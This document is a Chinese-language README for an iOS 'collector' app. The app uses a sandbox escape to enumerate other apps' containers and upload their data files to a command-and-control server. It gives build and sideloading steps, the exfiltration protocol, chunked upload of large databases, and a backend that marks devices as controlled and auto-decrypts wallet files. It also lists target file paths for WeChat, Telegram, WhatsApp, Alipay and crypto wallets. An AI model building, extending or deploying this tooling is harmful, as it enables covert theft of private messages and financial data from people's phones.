# collector —— worse_query 采集端（iOS 26 / 27）

把 `worse_query` 的沙盒逃逸包成一个能用的采集端：枚举其他 App 容器 → 读取 db/plist/json → 按新v2 的 `POST /stats` 协议回传，后台会落到 `devices` / `wallet_data` 并进入现有解析链。

> 能力边界：**只读其他 App 容器**（Documents/Library 里的常见数据文件），不含内核、不含 Keychain、不修改数据。
> 覆盖版本：按上游 README 是 iOS 26.0–26.7.2 / **27.2**；27.2.1 由衍生工具声称支持，**未官方确认**，先在真机上用「① 测试沙盒逃逸」验证。

---

## 一、目录

```
collector/
├── Bridge/                     worse_query.m/h + pathleak.m/h（来自 forcequitOS/worse_query，GPL-3.0）
├── Sources/
│   ├── CollectorApp.swift      @main
│   ├── ContentView.swift       三步 UI：测试逃逸 / 枚举容器 / 读取并上传
│   ├── Uploader.swift          POST /stats（base64、X-Device-UUID、24MB 上限）
│   └── Collector-Bridging-Header.h
├── Collector.entitlements      com.apple.security.application-groups
├── project.yml                 XcodeGen 工程描述
└── .github/workflows/build-collector.yml   云端出 unsigned IPA
```

---

## 二、两条构建路线

> **没有任何 Mac？** 直接看 [BUILD-NO-MAC.md](BUILD-NO-MAC.md)：GitHub Actions 出 unsigned IPA → Windows 用 AltStore/SideStores 签名，全程不碰 Mac。

### A. 有 Mac + Xcode（最快）

```bash
brew install xcodegen
cd collector && xcodegen generate
open Collector.xcodeproj
# 1) Signing & Capabilities: 选自己的 Team，Bundle ID 改成唯一的（如 com.你的名.collector）
# 2) + Capability → App Groups，加一个 group（必须与 Collector.entitlements、ContentView 默认值一致）
# 3) 真机运行，首次运行信任开发者证书（设置 → 通用 → VPN与设备管理）
```

免费 Apple ID 签的证书 **7 天过期**，到期重签即可。

### B. 没有 Mac（GitHub Actions 出 unsigned IPA，再用 AltStore/SideStores 签）

1. 把 `collector/` 推到任意 GitHub 仓库；
2. Actions → `build-collector` → Run workflow；
3. 下载 artifact `collector-unsigned-ipa`；
4. Windows 上装 [AltStore](https://altstore.io/) 或 SideStores，用 Apple ID 导入这个 ipa —— 它们会**重新签名并自动创建 App Group**；
5. 装好后打开 collector，把 App Group 填成签名时生成的那个（AltStore 一般是 `group.<bundle id>`）。

---

## 三、三步操作

| 步骤 | 做什么 | 失败码含义 |
|---|---|---|
| ① 测试沙盒逃逸 | 对 `/var/mobile/Containers/Data/Application` 申请扩展，打印句柄 | `-1` App Group 不存在/不可访问；`-2` 私有符号解析失败（系统版本不支持）；`-4` 建符号链接失败；`-5` 容器管理器拒绝；`-6` 内核拒绝签发 |
| ② 枚举容器 | `pathleak` 爆破 inode 反查路径，再逐个 consume + `getxattr` 取 bundle id | 命中 0 通常是 baseline inode 取不到，或系统把 `/var/mobile/Containers/Data/Application` 也加了限制 |
| ③ 读取并上传 | 对选中容器遍历 Documents/Library，上传 `db/sqlite/plist/json/txt/log/dat/bin` | 后台 `/stats` 限制单文件 24MB（超限跳过） |

C2 默认 `http://192.168.100.10:8080`，`/stats` 走的是你现有部署，落盘在 `backend/data/darksword_uploads/<serial>/`，并按 `category=container-<bundleid>` 入库。

---

## 四、装好后先确认「逃逸在 27.2.1 上是否成立」

如果 ① 返回正数句柄、② 能列出真实 bundle id，说明这台 27.2.1 的沙盒逃逸成立；若 ① 报 `-6`/`-5`，说明该 build 已修或 flag 需要再调（`worse_query.m` 里 `alt_flags` 分支就是给 26/27 不同 flag 用的）。

> 更省事的验证：先装社区现成的 [WQ Files](https://github.com/kolbicz/WQFiles)（AltStore 装），能列出其他 App 目录就说明逃逸成立；成立再回来签 collector 做自动化回传。

---

## 五、后端侧（已就绪，无需改动）

- `POST /stats`：`{category, path, size, data(base64), deviceSerial, deviceVersion}` → 落盘 + `_upsert_device(mark_controlled=True)`
- 文件按扩展名进入现有解析：`walletsV2_*.json` 触发自动解密；`ChatStorage.sqlite`/`NoteStore.sqlite` 触发社交数据解析
- 后台「设备管理」里会多出这台设备，`category` 以 `container-` 开头，日志里可见

---

## 六、注意

- `worse_query` 原仓库是 **GPL-3.0**，本目录的 `Bridge/` 是它的派生（保留头注释），自用没问题，分发要注意协议。
- 采集端只读；`worse_query` 的写/删能力没有接进来。
- 27.2.1 未官方确认；先 ① 验证，别先批量跑 ③。

---

## 十、App 端能力升级（2026-11-12）

| 能力 | 说明 |
|---|---|
| **目标预设** | 内置常见 bundle 前缀：微信 `com.tencent.xin`、Telegram `ph.telegra.Telegraph`、WhatsApp `net.whatsapp.WhatsApp`、支付宝 `com.alipay.iphoneclient`、Trust Wallet、imToken、TokenPocket、Binance；枚举后自动打标，默认"只上传命中预设的容器" |
| **大文件分片** | 单文件 >8MB 自动按 8MB 分片，带 `uploadId/part/total` 上传；服务端按序合并，微信 `MM.sqlite`（几百 MB）也能传 |
| **服务端合并** | `POST /stats` 新增分片分支：`.parts/<uploadId>/0001…` 收齐后合并成目标文件名，删除分片目录；合并后照常进 DB/事件/自动解析 |
| **测试日志** | 一键 `GET /log?kind=collector&msg=…`，后台实时日志立刻能看到这台设备上线 |

验证（服务端回放 3 片 5MB 随机数据）：

```
part 1 -> 200 {"chunk":1,"total":3,"have":1}
part 2 -> 200 {"chunk":2,"total":3,"have":2}
part 3 -> 200 {"ok":true}
merged size=5242880  sha256 match=True
```

## 十一、采集目标建议（按文件）

| 目标 | bundle 前缀 | 主要文件 |
|---|---|---|
| 微信 | com.tencent.xin | `Documents/MM.sqlite`、`EnMicroMsg.db`、`WCDB_Contact.sqlite` |
| Telegram | ph.telegra.Telegraph | `Documents/postbox.sqlite`、`Library/Application Support/*.sqlite` |
| WhatsApp | net.whatsapp.WhatsApp | `Documents/ChatStorage.sqlite`、`Media/` |
| 支付宝 | com.alipay.iphoneclient | `Documents/*.db` |
| 钱包类 | Trust / imToken / TokenPocket / Binance | `Documents/*.json`、`*.sqlite`、`Library/Preferences/*.plist` |

钱包类 App 的助记词多数在 Keychain（容器外），容器内能拿到的是地址簿、余额缓存、导入记录——这些已经能支撑"地址/资产"维度的归档。
